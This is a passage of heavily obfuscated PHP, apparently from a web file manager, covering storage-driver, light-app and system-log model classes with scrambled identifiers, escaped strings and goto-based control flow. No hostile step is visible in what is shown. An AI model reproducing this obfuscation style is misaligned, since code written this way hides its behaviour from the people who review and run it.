!class_exists($aÅ¬º²ò±ï)) { if ($fÇøªŒâ²) { return LNG($bë›™ø÷[2037]); } write_log(array($bë›™ø÷[2038], $BÑÏÈ­ßŠ, get_caller_info()), $bë›™ø÷[2039]); show_json(LNG($bë›™ø÷[2037]), !1, $BÑÏÈ­ßŠ); } goto BÖÍ¹ÏÖ•; DÕïÑ­í¹: } public function driverListSystem() { $f‹‹Œ¬Å±ë =& $_SERVER[›é¼±]; $eÅìŞ†Òæä = parent::listData(); $a˜Öïˆµƒè = array(); foreach ($eÅìŞ†Òæä as $e›ôš…æœ) { unset($e›ôš…æœ[$f‹‹Œ¬Å±ë[194]], $e›ôš…æœ[$f‹‹Œ¬Å±ë[84]]); $e›ôš…æœ[$f‹‹Œ¬Å±ë[6]] = json_decode($e›ôš…æœ[$f‹‹Œ¬Å±ë[6]], !0); $a˜Öïˆµƒè[] = $e›ôš…æœ; } return $a˜Öïˆµƒè; } public function defaultDriver() { $fŞ“¨ö‘ =& $_SERVER[›é¼±]; $b‰†ò–‚í = parent::listData(); $f³æ¡ë£¸Å = array_filter_by_field($b‰†ò–‚í, $fŞ“¨ö‘[34], 1); $f³æ¡ë£¸Å = $f³æ¡ë£¸Å[0]; if ($f³æ¡ë£¸Å) { $f³æ¡ë£¸Å[$fŞ“¨ö‘[6]] = json_decode($f³æ¡ë£¸Å[$fŞ“¨ö‘[6]], !0); } return $f³æ¡ë£¸Å; } public function driverInfo($c¹öó§İõ¦) { $Fà‡Şõò =& $_SERVER[›é¼±]; $e°ßØÛê‹— = array_to_keyvalue(parent::listData(), $Fà‡Şõò[395]); if (!isset($e°ßØÛê‹—[$c¹öó§İõ¦])) { return !1; } $cµ˜¼—ƒÉØ = $e°ßØÛê‹—[$c¹öó§İõ¦]; $cµ˜¼—ƒÉØ[$Fà‡Şõò[6]] = json_decode($cµ˜¼—ƒÉØ[$Fà‡Şõò[6]], !0); return $cµ˜¼—ƒÉØ; } public function remove($Cù…ªÛáÆ) { $this->removeShareItems($Cù…ªÛáÆ); return parent::remove($Cù…ªÛáÆ); } public function removeWithFile($Fö‹Ã”‰, $fÈ•ÎÒÑˆÎ) { goto C¥’ïßÎñ ; e“ØŠßî›: $B¶ß“ÕìÉ = "\173\151\x6f\72{$aâ¿íøöƒ}\175\57"; $e™…ÔÉÇˆ› = !0; $DŸ‰¹äøòÒ = array(); goto bÉ¯§µßÀ; C¥’ïßÎñ : $EÀô¡²¥ô =& $_SERVER[›é¼±]; $aäëó›„îÇ = array($EÀô¡²¥ô[819] => $Fö‹Ã”‰); $f‹ÙŞËÒ›ù = Model($EÀô¡²¥ô[464])->where($aäëó›„îÇ)->count(); goto B©Ó×Ôô·À; bÉ¯§µßÀ: $e‚ÎÚ£ÅÜ = Model($EÀô¡²¥ô[193])->where($aäëó›„îÇ)->field($EÀô¡²¥ô[2045])->select(); foreach ($e‚ÎÚ£ÅÜ as $FçÄİ¾ì†æ) { goto DòñƒØÔ‚Ì; f…ë¸åø†: if (IO::exist($DØªí•ËòÉ)) { $eŸƒ†‰­ª‘->updateFileEnd($FçÄİ¾ì†æ[$EÀô¡²¥ô[28]], $FçÄİ¾ì†æ[$EÀô¡²¥ô[78]]); continue; } if (!IO::move($a¢‹Œ‰ÉŸ, get_path_father($DØªí•ËòÉ))) { $e™…ÔÉÇˆ› = !1; break; } $aäëó›„îÇ = array($EÀô¡²¥ô[461] => $FçÄİ¾ì†æ[$EÀô¡²¥ô[461]]); goto cª‡å†ÖÁ§; cª‡å†ÖÁ§: $AÀø§á„Œò = array($EÀô¡²¥ô[819] => $aâ¿íøöƒ, $EÀô¡²¥ô[76] => $DØªí•ËòÉ); Model($EÀô¡²¥ô[193])->where($aäëó›„îÇ)->save($AÀø§á„Œò); goto e‘ğÛ‘Á¼Ã; DòñƒØÔ‚Ì: $a¢‹Œ‰ÉŸ = $FçÄİ¾ì†æ[$EÀô¡²¥ô[76]]; $DØªí•ËòÉ = $B¶ß“ÕìÉ . str_replace("\173\x69\x6f\x3a{$Fö‹Ã”‰}\x7d\x2f", $EÀô¡²¥ô[33], $a¢‹Œ‰ÉŸ); if (!IO::exist($a¢‹Œ‰ÉŸ)) { $DŸ‰¹äøòÒ[] = $FçÄİ¾ì†æ[$EÀô¡²¥ô[461]]; $eŸƒ†‰­ª‘->updateFileEnd($FçÄİ¾ì†æ[$EÀô¡²¥ô[28]], $FçÄİ¾ì†æ[$EÀô¡²¥ô[78]]); continue; } goto f…ë¸åø†; e‘ğÛ‘Á¼Ã: } $this->removeByFileID($DŸ‰¹äøòÒ); goto d¿Æ¹µ­İ­; d¿Æ¹µ­İ­: if (!$e™…ÔÉÇˆ›) { $eŸƒ†‰­ª‘->stop($cî¹İÁĞ„); return !1; } $eŸƒ†‰­ª‘->end(); if ($fÈ•ÎÒÑˆÎ == $EÀô¡²¥ô[1699]) { $this->remove($Fö‹Ã”‰); } goto B‹ŸÉ‹İÃ‚; B©Ó×Ôô·À: $AÂİ„à“ã = Model($EÀô¡²¥ô[464])->where($aäëó›„îÇ)->sum($EÀô¡²¥ô[78]); $cî¹İÁĞ„ = $fÈ•ÎÒÑˆÎ . $EÀô¡²¥ô[2043] . $Fö‹Ã”‰; $eŸƒ†‰­ª‘ = new TaskFileTransfer($cî¹İÁĞ„, $EÀô¡²¥ô[2039], $f‹ÙŞËÒ›ù, LNG($EÀô¡²¥ô[2044]) . "\50{$Fö‹Ã”‰}\x29"); goto eÄŠËÍ¼ê’; eÄŠËÍ¼ê’: $eŸƒ†‰­ª‘->task[$EÀô¡²¥ô[758]] = (double) $AÂİ„à“ã; $F‘ÚôãĞ‡“ = KodIO::defaultDriver(); $aâ¿íøöƒ = $F‘ÚôãĞ‡“[$EÀô¡²¥ô[395]]; goto e“ØŠßî›; B‹ŸÉ‹İÃ‚: } public function progress($cÖ‚Ğ®êã, $B‘‡ƒøä–Õ) { return Task::get($B‘‡ƒøä–Õ . $_SERVER[›é¼±][2043] . $cÖ‚Ğ®êã); } private function removeByFileID($dÄ‹áÜÌŠ = array()) { goto dğè˜¸´ê²; dğè˜¸´ê²: $dº™«Á¡ =& $_SERVER[›é¼±]; if (empty($dÄ‹áÜÌŠ)) { return; } $båƒÌï˜áå = array($dº™«Á¡[461] => array($dº™«Á¡[7], $dÄ‹áÜÌŠ)); goto D¦È¢†»¶; D¦È¢†»¶: $C±ÃÖÆì…Œ = Model($dº™«Á¡[1239])->where($båƒÌï˜áå)->field($dº™«Á¡[397])->select(); if (!$C±ÃÖÆì…Œ) { return; } $C±ÃÖÆì…Œ = array_to_keyvalue($C±ÃÖÆì…Œ, $dº™«Á¡[33], $dº™«Á¡[397]); goto f¾‰ŸË¦Œ; f¾‰ŸË¦Œ: foreach ($C±ÃÖÆì…Œ as $Cêõ›…ªÆÃ) { Model($dº™«Á¡[411])->removeNow($Cêõ›…ªÆÃ, !1); } goto CÛÙ—Ù£Šƒ; CÛÙ—Ù£Šƒ: } private function removeShareItems($bÇ£×ùÊ½¹) { goto bÈÑß¡‹³Á; cÔÍ¾ƒùœæ: Model($d–°…§½¸Í[589])->remove($F—ˆ‹½£); goto FŒŒ‚„ƒºğ; FèŠÉ¿ê: $Bí’Ò‚¢šª = Model($d–°…§½¸Í[1710])->where($eÎˆÃ…Õ…ˆ)->field($d–°…§½¸Í[482])->select(); if (empty($Bí’Ò‚¢šª)) { return; } $F—ˆ‹½£ = array_to_keyvalue($Bí’Ò‚¢šª, $d–°…§½¸Í[33], $d–°…§½¸Í[482]); goto cÔÍ¾ƒùœæ; bÈÑß¡‹³Á: $d–°…§½¸Í =& $_SERVER[›é¼±]; $eíÎŠ¢Ã¸ = "\173\151\x6f\72{$bÇ£×ùÊ½¹}\x7d\57"; $eÎˆÃ…Õ…ˆ = array($d–°…§½¸Í[397] => 0, $d–°…§½¸Í[1104] => array($d–°…§½¸Í[381], "{$eíÎŠ¢Ã¸}\45")); goto FèŠÉ¿ê; FŒŒ‚„ƒºğ: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\x2e\114\x69\x67\150\x74\101\160\160"; public $modelType = "\123\171\x73\164\145\155\117\160\x74\x69\x6f\x6e"; public $field = array("\x6e\141\x6d\x65", "\x67\x72\157\x75\x70", "\x64\x65\163\x63", "\x63\x6f\156\x74\x65\156\x74"); public function listData($bÃğ—¨Ñìè = false, $c»¬‡šíê‚ = "\x6d\157\x64\x69\146\171\124\x69\155\145", $Fœèòåš¬— = true) { return parent::listData($bÃğ—¨Ñìè, $c»¬‡šíê‚, $Fœèòåš¬—); } public function remove($a˜áíÓŞßë) { $DÔ‡Éø‰êË = $this->findByName($a˜áíÓŞßë); if (!$DÔ‡Éø‰êË) { return !1; } return parent::remove($DÔ‡Éø‰êË[$_SERVER[›é¼±][395]]); } public function add($cùêôÜ·ô) { if ($this->findByName($cùêôÜ·ô[$_SERVER[›é¼±][28]])) { return !1; } return parent::insert($cùêôÜ·ô); } public function update($A„ºæ¬µà, $f¥±ºĞÂ¿‚) { $D›»Ã†á¿½ =& $_SERVER[›é¼±]; $eë„„‡ë´Á = $this->findByName($A„ºæ¬µà); $b‹Ãõî×Ó = $this->findByName($f¥±ºĞÂ¿‚[$D›»Ã†á¿½[28]]); if (!$eë„„‡ë´Á || $b‹Ãõî×Ó && $b‹Ãõî×Ó[$D›»Ã†á¿½[395]] != $eë„„‡ë´Á[$D›»Ã†á¿½[395]]) { return !1; } return parent::update($eë„„‡ë´Á[$D›»Ã†á¿½[395]], $f¥±ºĞÂ¿‚); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\x65\155\137\154\x6f\x67"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\x65\124\x69\155\145", "\164\x69\x6d\x65", "\x69\x6e\x73\145\162\x74", "\146\x75\156\143\164\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $EÃø¿Î¶ÇÕ =& $_SERVER[›é¼±]; return array($EÃø¿Î¶ÇÕ[2046] => LNG($EÃø¿Î¶ÇÕ[2047]), $EÃø¿Î¶ÇÕ[2048] => LNG($EÃø¿Î¶ÇÕ[2049]), $EÃø¿Î¶ÇÕ[1673] => LNG($EÃø¿Î¶ÇÕ[2050]), $EÃø¿Î¶ÇÕ[2051] => LNG($EÃø¿Î¶ÇÕ[2052]), $EÃø¿Î¶ÇÕ[2053] => LNG($EÃø¿Î¶ÇÕ[2054]), $EÃø¿Î¶ÇÕ[2055] => LNG($EÃø¿Î¶ÇÕ[2056]), $EÃø¿Î¶ÇÕ[2057] => LNG($EÃø¿Î¶ÇÕ[2058]), $EÃø¿Î¶ÇÕ[1703] => LNG($EÃø¿Î¶ÇÕ[2058]), $EÃø¿Î¶ÇÕ[1704] => LNG($EÃø¿Î¶ÇÕ[2059]), $EÃø¿Î¶ÇÕ[2060] => LNG($EÃø¿Î¶ÇÕ[2061]), $EÃø¿Î¶ÇÕ[2062] => LNG($EÃø¿Î¶ÇÕ[2063]), $EÃø¿Î¶ÇÕ[2064] => LNG($EÃø¿Î¶ÇÕ[2065]), $EÃø¿Î¶ÇÕ[2066] => LNG($EÃø¿Î¶ÇÕ[2067]), $EÃø¿Î¶ÇÕ[1701] => LNG($EÃø¿Î¶ÇÕ[2068]), $EÃø¿Î¶ÇÕ[2069] => LNG($EÃø¿Î¶ÇÕ[2070]), $EÃø¿Î¶ÇÕ[1708] => LNG($EÃø¿Î¶ÇÕ[2071]), $EÃø¿Î¶ÇÕ[2072] => LNG($EÃø¿Î¶ÇÕ[2073]), $EÃø¿Î¶ÇÕ[2074] => LNG($EÃø¿Î¶ÇÕ[2075]), $EÃø¿Î¶ÇÕ[2076] => LNG($EÃø¿Î¶ÇÕ[2077]), $EÃø¿Î¶ÇÕ[2078] => LNG($EÃø¿Î¶ÇÕ[2079]), $EÃø¿Î¶ÇÕ[1711] => LNG($EÃø¿Î¶ÇÕ[2080]), $EÃø¿Î¶ÇÕ[1712] => LNG($EÃø¿Î¶ÇÕ[2081]), $EÃø¿Î¶ÇÕ[2082] => LNG($EÃø¿Î¶ÇÕ[2083]), $EÃø¿Î¶ÇÕ[2084] => LNG($EÃø¿Î¶ÇÕ[2085]), $EÃø¿Î¶ÇÕ[2086] => LNG($EÃø¿Î¶ÇÕ[2087]), $EÃø¿Î¶ÇÕ[1706] => LNG($EÃø¿Î¶ÇÕ[2088]), $EÃø¿Î¶ÇÕ[2089] => LNG($EÃø¿Î¶ÇÕ[2090]), $EÃø¿Î¶ÇÕ[1705] => LNG($EÃø¿Î¶ÇÕ[2091]), $EÃø¿Î¶ÇÕ[2092] => LNG($EÃø¿Î¶ÇÕ[2093]), $EÃø¿Î¶ÇÕ[2094] => LNG($EÃø¿Î¶ÇÕ[2095]), $EÃø¿Î¶ÇÕ[2096] => LNG($EÃø¿Î¶ÇÕ[2097]), $EÃø¿Î¶ÇÕ[2098] => LNG($EÃø¿Î¶ÇÕ[2098]), $EÃø¿Î¶ÇÕ[2099] => LNG($EÃø¿Î¶ÇÕ[1677]), $EÃø¿Î¶ÇÕ[2100] => LNG($EÃø¿Î¶ÇÕ[2101]), $EÃø¿Î¶ÇÕ[2102] => LNG($EÃø¿Î¶ÇÕ[2103]), $EÃø¿Î¶ÇÕ[2104] => LNG($EÃø¿Î¶ÇÕ[2105]), $EÃø¿Î¶ÇÕ[2106] => LNG($EÃø¿Î¶ÇÕ[2107]), $EÃø¿Î¶ÇÕ[2108] => LNG($EÃø¿Î¶ÇÕ[2109]), $EÃø¿Î¶ÇÕ[2110] => LNG($EÃø¿Î¶ÇÕ[2110]), $EÃø¿Î¶ÇÕ[2111] => LNG($EÃø¿Î¶ÇÕ[2112]), $EÃø¿Î¶ÇÕ[2113] => LNG($EÃø¿Î¶ÇÕ[2114]), $EÃø¿Î¶ÇÕ[2115] => LNG($EÃø¿Î¶ÇÕ[2116]), $EÃø¿Î¶ÇÕ[2117] => LNG($EÃø¿Î¶ÇÕ[2118]), $EÃø¿Î¶ÇÕ[2119] => LNG($EÃø¿Î¶ÇÕ[2120]), $EÃø¿Î¶ÇÕ[2121] => LNG($EÃø¿Î¶ÇÕ[2122])); } private function typeFile() { $A»¨—‘Š‰ =& $_SERVER[›é¼±]; $fÒ¬¶„ƒ…‡ = array($A»¨—‘Š‰[1708] => array($A»¨—‘Š‰[1709]), $A»¨—‘Š‰[2064] => array($A»¨—‘Š‰[2123]), $A»¨—‘Š‰[2066] => array($A»¨—‘Š‰[2124]), $A»¨—‘Š‰[1701] => array($A»¨—‘Š‰[1702]), $A»¨—‘Š‰[2074] => array(), $A»¨—‘Š‰[2076] => array(), $A»¨—‘Š‰[2078] => array(), $A»¨—‘Š‰[1711] => array($A»¨—‘Š‰[1713]), $A»¨—‘Š‰[1712] => array($A»¨—‘Š‰[1713]), $A»¨—‘Š‰[2082] => array($A»¨—‘Š‰[2125]), $A»¨—‘Š‰[2084] => array($A»¨—‘Š‰[2125]), $A»¨—‘Š‰[2086] => array($A»¨—‘Š‰[2126]), $A»¨—‘Š‰[2072] => array($A»¨—‘Š‰[2127]), $A»¨—‘Š‰[1706] => array($A»¨—‘Š‰[2128]), $A»¨—‘Š‰[2089] => array($A»¨—‘Š‰[2129]), $A»¨—‘Š‰[1705] => array($A»¨—‘Š‰[1707])); return $fÒ¬¶„ƒ…‡; } private function typeAll() { goto F˜øçæïõá; DŒº ÛƒŠ : return $aÂ”«³ŠéÈ; goto D…‚Æâ¬™Õ; F˜øçæïõá: $F•±¨˜§ =& $_SERVER[›é¼±]; $aÂ”«³ŠéÈ = $this->typeList; $b«”ñºĞóš = array_filter($this->typeFile()); goto f±Ö²·Õ»; f±Ö²·Õ»: foreach ($b«”ñºĞóš as $D°Œì»¯‡‚ => $fš•Ø«‡šë) { $aÂ”«³ŠéÈ[$fš•Ø«‡šë[0]] = $aÂ”«³ŠéÈ[$D°Œì»¯‡‚]; } $aÂ”«³ŠéÈ[$F•±¨˜§[1713]] = LNG($F•±¨˜§[2130]); $aÂ”«³ŠéÈ[$F•±¨˜§[2125]] = LNG($F•±¨˜§[2131]); goto DŒº ÛƒŠ ; D…‚Æâ¬™Õ: } public function addLog($E«½±Ìèåğ, $b©¼¡™´´­ = array()) { goto C¹ï†ÍÒĞº; d— È­Â³: $b©¼¡™´´­ = array($b³–×öÍ¥[1554] => Session::sign(), $b³–×öÍ¥[1555] => $cİÙ½Ö‹ïÕ, $b³–×öÍ¥[29] => $E«½±Ìèåğ, $b³–×öÍ¥[1557] => json_encode($b©¼¡™´´­)); parent::add($b©¼¡™´´­); goto bõœ„Ëá; Fíñ¥åØÎ©: if (!$cİÙ½Ö‹ïÕ) { $cİÙ½Ö‹ïÕ = (int) Session::get($b³–×öÍ¥[1864]); } $BÄñ²Û¯ÉÎ = get_client_ip(); if (!$b©¼¡™´´­ || strlen(json_encode($b©¼¡™´´­)) >= 1024) { $b©¼¡™´´­ = array($b³–×öÍ¥[2132] => $BÄñ²Û¯ÉÎ); } else { if (is_array($b©¼¡™´´­)) { $b©¼¡™´´­[$b³–×öÍ¥[2132]] = $BÄñ²Û¯ÉÎ; } else { $b©¼¡™´´­ = array($b³–×öÍ¥[1121] => $b©¼¡™´´­, $b³–×öÍ¥[2132] => $BÄñ²Û¯ÉÎ); } } goto d— È­Â³; C¹ï†ÍÒĞº: $b³–×öÍ¥ =& $_SERVER[›é¼±]; if (!isset($this->typeList[$E«½±Ìèåğ])) { return; } $cİÙ½Ö‹ïÕ = defined($b³–×öÍ¥[468]) && USER_ID ? USER_ID : (isset($b©¼¡™´´­[$b³–×öÍ¥[1564]]) ? $b©¼¡™´´­[$b³–×öÍ¥[1564]] : 0); goto Fíñ¥åØÎ©; bõœ„Ëá: } public function remove($A¨ïî¦´ÀŠ) { $this->where(array($_SERVER[›é¼±][414] => $A¨ïî¦´ÀŠ))->delete(); } private function _makeOrder($bó‹á™½‹ñ = '') { goto Fªƒˆ—âÈ; Fªƒˆ—âÈ: $dŠô§Š¿Ü =& $_SERVER[›é¼±]; $E·Æ¬ÅêÁ‹ = $dŠô§Š¿Ü[194]; $c­‰“´Ï‹ = array($dŠô§Š¿Ü[442] => $dŠô§Š¿Ü[443], $dŠô§Š¿Ü[444] => $dŠô§Š¿Ü[445]); goto Dæ‡Ù¨¤İ¦; d´Ù×­¤Œ: return $this->order($bó‹á™½‹ñ); goto F¥ÃÀùçôÌ; Dæ‡Ù¨¤İ¦: $f…ŒÁŒ„ò­ = Input::get($dŠô§Š¿Ü[450], $dŠô§Š¿Ü[7], $dŠô§Š¿Ü[1896], array($dŠô§Š¿Ü[1820], $dŠô§Š¿Ü[444])); $f…ŒÁŒ„ò­ = $c­‰“´Ï‹[$f…ŒÁŒ„ò­]; $bó‹á™½‹ñ = $bó‹á™½‹ñ . "{$E·Æ¬ÅêÁ‹}\40{$f…ŒÁŒ„ò­}"; goto d´Ù×­¤Œ; F¥ÃÀùçôÌ: } public function get($f²šãÌ… = '') { goto b˜³¸Ù‡£Ş; EŒÎæìËÃâ: if (!empty($f²šãÌ…[$eŠÊĞÃíä[2132]])) { $E˜ˆ¼õ´¬‹[$eŠÊĞÃíä[445]] = array($eŠÊĞÃíä[381], "\45{$f²šãÌ…[$eŠÊĞÃíä[2132]]}\x25"); } $E¦‡‡ØÔ©Ú = $this->_makeOrder()->where($E˜ˆ¼õ´¬‹)->selectPage(); if (empty($E¦‡‡ØÔ©Ú[$eŠÊĞÃíä[367]])) { show_json(array(), !0, $E¦‡‡ØÔ©Ú[$eŠÊĞÃíä[364]]); } goto BáœŒÒ‹‚“; BáœŒÒ‹‚“: $E¦‡‡ØÔ©Ú[$eŠÊĞÃíä[367]] = $this->logList($E¦‡‡ØÔ©Ú[$eŠÊĞÃíä[367]]); return $E¦‡‡ØÔ©Ú; goto F©¦ÜåÙŠæ; b˜³¸Ù‡£Ş: $eŠÊĞÃíä =& $_SERVER[›é¼±]; if (!$f²šãÌ…) { show_json(array()); } $E˜ˆ¼õ´¬‹ = array(); goto e¹²ˆÖÓ„‰; e¹²ˆÖÓ„‰: if ($f²šãÌ…[$eŠÊĞÃíä[1564]]) { $E˜ˆ¼õ´¬‹[$eŠÊĞÃíä[1564]] = $f²šãÌ…[$eŠÊĞÃíä[1564]]; } if (isset($f²šãÌ…[$eŠÊĞÃíä[756]])) { $A†§ÁİÎ›À = $f²šãÌ…[$eŠÊĞÃíä[756]]; $B×á¸‘ìÆï = isset($f²šãÌ…[$eŠÊĞÃíä[490]]) ? $f²šãÌ…[$eŠÊĞÃíä[490]] : time(); $E˜ˆ¼õ´¬‹[$eŠÊĞÃíä[194]] = array($eŠÊĞÃíä[331], array($A†§ÁİÎ›À, $B×á¸‘ìÆï)); } if ($f²šãÌ…[$eŠÊĞÃíä[29]]) { $bƒñ˜¶ÅÌÙ = explode($eŠÊĞÃíä[47], $f²šãÌ…[$eŠÊĞÃíä[29]]); $bÙ…¦ÖÏ•â = $this->typeFile(); $C‡§¶‡×  = array(); foreach ($bƒñ˜¶ÅÌÙ as $béÉ„»òàš) { $C‡§¶‡× [] = $béÉ„»òàš; if (isset($bÙ…¦ÖÏ•â[$béÉ„»òàš])) { $C‡§¶‡×  = array_merge($C‡§¶‡× , $bÙ…¦ÖÏ•â[$béÉ„»òàš]); } } $C‡§¶‡×  = array_unique($C‡§¶‡× ); if ($C‡§¶‡× ) { $E˜ˆ¼õ´¬‹[$eŠÊĞÃíä[29]] = array($eŠÊĞÃíä[7], $C‡§¶‡× ); } } else { $E˜ˆ¼õ´¬‹[$eŠÊĞÃíä[29]] = array($eŠÊĞÃíä[2133], $eŠÊĞÃíä[2134]); } goto EŒÎæìËÃâ; F©¦ÜåÙŠæ: } private function ipAddress(&$E¶êö»¯ëˆ) { $dôìÒäù—° =& $_SERVER[›é¼±]; if (!empty($E¶êö»¯ëˆ[$dôìÒäù—°[2132]])) { $bë˜¸Ó”á® = IpLocation::get($E¶êö»¯ëˆ[$dôìÒäù—°[2132]]); } else { $bë˜¸Ó”á® = LNG($dôìÒäù—°[2135]); } $E¶êö»¯ëˆ[$dôìÒäù—°[2136]] = $bë˜¸Ó”á®; } private function descZipDownload($DÌ”‡øé•Š, &$b©‹ğ…Ã©„) { $a½‘ù³¼¢ =& $_SERVER[›é¼±]; if (!isset($DÌ”‡øé•Š[$a½‘ù³¼¢[2137]])) { return; } $B‡„íÚ˜¦ö = json_decode($DÌ”‡øé•Š[$a½‘ù³¼¢[2137]], !0); foreach ($B‡„íÚ˜¦ö as $b‡¼Ú©˜™‹) { try { $e–±¬’¹Š = IO::infoFull($b‡¼Ú©˜™‹[$a½‘ù³¼¢[76]]); } catch (Exception $b’Ë²Ú¬÷´) { continue; } $DÌ”‡øé•Š[$a½‘ù³¼¢[76]] = $b‡¼Ú©˜™‹[$a½‘ù³¼¢[76]]; $b©‹ğ…Ã©„[] = $DÌ”‡øé•Š[$a½‘ù³¼¢[397]] = $e–±¬’¹Š[$a½‘ù³¼¢[397]]; $b©‹ğ…Ã©„[] = $DÌ”‡øé•Š[$a½‘ù³¼¢[1950]] = $e–±¬’¹Š[$a½‘ù³¼¢[492]]; break; } return $DÌ”‡øé•Š; } private function getSourceList(&$e‘°‹Ë§ğË) { $cºšÚ¾îÇÙ =& $_SERVER[›é¼±]; $fâêÛÓ³˜‡ = array(); foreach ($e‘°‹Ë§ğË as $FË—¶òöÁÂ => $c ‚„Úš›ø) { goto CÕ»ÚŒºœº; aÅÓ¯’¬´: if ($fºˆÙò…[$cºšÚ¾îÇÙ[29]] == $cºšÚ¾îÇÙ[1958]) { $fâêÛÓ³˜‡[] = $fºˆÙò…[$cºšÚ¾îÇÙ[445]][$cºšÚ¾îÇÙ[397]]; } goto bÖ´ÑÑó®; CÕ»ÚŒºœº: $fºˆÙò… = json_decode($c ‚„Úš›ø[$cºšÚ¾îÇÙ[445]], !0); if ($c ‚„Úš›ø[$cºšÚ¾îÇÙ[29]] == $cºšÚ¾îÇÙ[1704]) { $fºˆÙò… = $this->descZipDownload($fºˆÙò…, $fâêÛÓ³˜‡); $e‘°‹Ë§ğË[$FË—¶òöÁÂ][$cºšÚ¾îÇÙ[445]] = json_encode($fºˆÙò…); continue; } if (strpos($c ‚„Úš›ø[$cºšÚ¾îÇÙ[29]], $cºšÚ¾îÇÙ[1951]) !== 0) { if (!isset($fºˆÙò…[$cºšÚ¾îÇÙ[76]]) || strpos($c ‚„Úš›ø[$cºšÚ¾îÇÙ[29]], $cºšÚ¾îÇÙ[2138]) !== 0) { continue; } try { $bñÛÙ¯Ô­ = IO::infoFull($fºˆÙò…[$cºšÚ¾îÇÙ[76]]); } catch (Exception $DÖÖ×Íˆµ°) { continue; } $fâêÛÓ³˜‡[] = $fºˆÙò…[$cºšÚ¾îÇÙ[397]] = $bñÛÙ¯Ô­[$cºšÚ¾îÇÙ[397]]; $fâêÛÓ³˜‡[] = $fºˆÙò…[$cºšÚ¾îÇÙ[1950]] = $bñÛÙ¯Ô­[$cºšÚ¾îÇÙ[492]]; $e‘°‹Ë§ğË[$FË—¶òöÁÂ][$cºšÚ¾îÇÙ[445]] = json_encode($fºˆÙò…); continue; } goto a¯ç¯ÛÚ—Ì; a¯ç¯ÛÚ—Ì: $fâêÛÓ³˜‡[] = $fºˆÙò…[$cºšÚ¾îÇÙ[397]]; $fâêÛÓ³˜‡[] = $fºˆÙò…[$cºšÚ¾îÇÙ[1950]]; if ($fºˆÙò…[$cºšÚ¾îÇÙ[29]] == $cºšÚ¾îÇÙ[545]) { $fâêÛÓ³˜‡[] = $fºˆÙò…[$cºšÚ¾îÇÙ[445]][$cºšÚ¾îÇÙ[1088]]; $fâêÛÓ³˜‡[] = $fºˆÙò…[$cºšÚ¾îÇÙ[445]][$cºšÚ¾îÇÙ[1089]]; } goto aÅÓ¯’¬´; bÖ´ÑÑó®: } if (!$fâêÛÓ³˜‡) { return array(); } return Model($cºšÚ¾îÇÙ[827])->sourceListInfo($fâêÛÓ³˜‡, !0); } private function logList($CÌ‘ã©¶ÙÌ) { goto FÚ ÔÓ–¤; eÛõ”¶ÈÍê: $dõÃœ®ñÃ  = array(); foreach ($CÌ‘ã©¶ÙÌ as $eèÈ»‚µÒù => $C´öÈ‰ÉÁ’) { goto EÆ½íî‘òé; bâé½—Û«À: unset($C´öÈ‰ÉÁ’[$F‘¾é¸Îèğ[2141]]); $DÌ„£Ö¥’ƒ[] = $C´öÈ‰ÉÁ’; goto bÅæéò‡ÃÒ; E±âÅß’Œº: $this->ipAddress($C´öÈ‰ÉÁ’); if (strpos($fÄ›¤¢ßŒ„, $F‘¾é¸Îèğ[1951]) === 0 || isset($eĞ¶Ó‚å„[$F‘¾é¸Îèğ[1950]])) { goto dâ“à…Œ¼À; Eêà“¡™„¹: if ($eĞ¶Ó‚å„[$F‘¾é¸Îèğ[1963]] && $eĞ¶Ó‚å„[$F‘¾é¸Îèğ[1963]][$F‘¾é¸Îèğ[406]] == $F‘¾é¸Îèğ[1204]) { $dõÃœ®ñÃ [] = $C´öÈ‰ÉÁ’[$F‘¾é¸Îèğ[395]]; unset($CÌ‘ã©¶ÙÌ[$eèÈ»‚µÒù]); continue; } goto CØá¥¸½¼; A²ä¨Ğ“ìß: if ($eĞ¶Ó‚å„[$F‘¾é¸Îèğ[29]] == $F‘¾é¸Îèğ[1958]) { $eĞ¶Ó‚å„[$F‘¾é¸Îèğ[445]][$F‘¾é¸Îèğ[397]] = $cÜ×¦‡ó¡¢[$eĞ¶Ó‚å„[$F‘¾é¸Îèğ[445]][$F‘¾é¸Îèğ[397]]]; } if ($eĞ¶Ó‚å„[$F‘¾é¸Îèğ[29]] == $F‘¾é¸Îèğ[1699]) { $eĞ¶Ó‚å„[$F‘¾é¸Îèğ[1963]] = $eĞ¶Ó‚å„[$F‘¾é¸Îèğ[85]]; $eĞ¶Ó‚å„[$F‘¾é¸Îèğ[1950]] = $eĞ¶Ó‚å„[$F‘¾é¸Îèğ[1963]][$F‘¾é¸Îèğ[397]]; $eĞ¶Ó‚å„[$F‘¾é¸Îèğ[85]] = !1; $eĞ¶Ó‚å„[$F‘¾é¸Îèğ[397]] = $F‘¾é¸Îèğ[33]; } if ($eĞ¶Ó‚å„[$F‘¾é¸Îèğ[85]] && $eĞ¶Ó‚å„[$F‘¾é¸Îèğ[85]][$F‘¾é¸Îèğ[406]] == $F‘¾é¸Îèğ[1204]) { $dõÃœ®ñÃ [] = $C´öÈ‰ÉÁ’[$F‘¾é¸Îèğ[395]]; unset($CÌ‘ã©¶ÙÌ[$eèÈ»‚µÒù]); continue; } goto Eêà“¡™„¹; dâ“à…Œ¼À: $eĞ¶Ó‚å„[$F‘¾é¸Îèğ[85]] = $cÜ×¦‡ó¡¢[$eĞ¶Ó‚å„[$F‘¾é¸Îèğ[397]]]; $eĞ¶Ó‚å„[$F‘¾é¸Îèğ[1963]] = $cÜ×¦‡ó¡¢[$eĞ¶Ó‚å„[$F‘¾é¸Îèğ[1950]]]; if ($eĞ¶Ó‚å„[$F‘¾é¸Îèğ[29]] == $F‘¾é¸Îèğ[545]) { $eĞ¶Ó‚å„[$F‘¾é¸Îèğ[445]][$F‘¾é¸Îèğ[1088]] = $cÜ×¦‡ó¡¢[$eĞ¶Ó‚å„[$F‘¾é¸Îèğ[445]][$F‘¾é¸Îèğ[1088]]]; $eĞ¶Ó‚å„[$F‘¾é¸Îèğ[445]][$F‘¾é¸Îèğ[1089]] = $cÜ×¦‡ó¡¢[$eĞ¶Ó‚å„[$F‘¾é¸Îèğ[445]][$F‘¾é¸Îèğ[1089]]]; } goto A²ä¨Ğ“ìß; CØá¥¸½¼: } 